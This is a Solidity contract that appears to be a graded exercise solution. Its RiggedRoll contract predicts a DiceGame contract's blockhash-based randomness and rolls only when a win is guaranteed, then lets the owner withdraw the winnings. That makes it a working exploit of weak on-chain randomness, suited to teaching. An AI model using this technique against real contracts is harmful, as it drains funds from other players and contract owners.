pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }



    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        to.transfer(amount);
    }
    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
     
     function riggedRoll() external payable {
        require(msg.value >= 0.002 ether, "Need to send at least 0.002 Ether");

        // Calculate the roll prediction using the current blockhash and nonce from the DiceGame
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        // We will only roll if we can guarantee a win (roll must be <= 5)
        require(roll <= 5, "Not a winning roll!");

        // Initiate the roll in the DiceGame contract
        (bool success, ) = address(diceGame).call{value: msg.value}(
            abi.encodeWithSignature("rollTheDice()")
        );
        require(success, "Roll failed");
    }
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    
    receive() external payable {}
}
